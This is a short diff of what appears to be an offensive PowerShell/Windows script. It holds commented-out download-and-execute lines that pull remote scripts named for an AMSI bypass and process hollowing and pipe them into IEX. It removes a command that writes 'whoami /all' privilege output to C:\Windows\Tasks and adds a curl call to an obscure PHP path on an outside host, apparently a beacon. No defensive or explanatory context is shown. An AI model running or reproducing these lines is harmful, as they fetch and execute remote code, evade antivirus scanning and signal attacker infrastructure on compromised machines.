@@ -1,4 +1,4 @@
 #(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tottix02/scripts/main/amsi.txt') | IEX
 #(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tottix02/scripts/main/amsidotnet.txt') | IEX
 #(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tottix02/scripts/main/hollow.txt') | IEX
-whoami /all > C:\Windows\Tasks\privs.txt
+curl https://tottix.com/.test/45636y364b736y364y36y36y3v5y3v6y35vy3.php
